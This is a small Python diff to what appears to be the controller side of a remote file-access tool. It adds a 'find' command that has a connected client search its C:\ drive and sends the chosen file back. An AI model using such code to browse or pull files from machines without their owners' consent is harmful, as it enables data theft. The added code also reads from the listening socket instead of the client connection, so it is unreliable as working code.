@@ -59,6 +59,8 @@ def get_files(s, client, path):
                 path += folderOrBack + "\\"
             client.send("KEEP GO".encode())  
          
+def ask_for_filename():
+    return input("You chose to find a file from the C:\\ directory, enter the filename you want to find\n")
 
 
 def deletePathLastElement(path):
@@ -80,10 +82,17 @@ def main():
     client_connection1, _ = s.accept() 
     client_connection1.send("HELLO".encode())
     client_connection1.recv(1024).decode()
+    print("dir / find")
     whatToDo = input("command - ")
     if whatToDo.lower() == "dir":
         client_connection1.send("DIR".encode())
         get_files(s, client_connection1, "C:\\")
+    elif whatToDo.lower() == "find":
+        client_connection1.send("FIND".encode())
+        filename = ask_for_filename()
+        client_connection1.send(filename.encode())
+        print("im here hey")
+        download_file(s, client_connection1, s.recv(1024).decode())
 
     
         
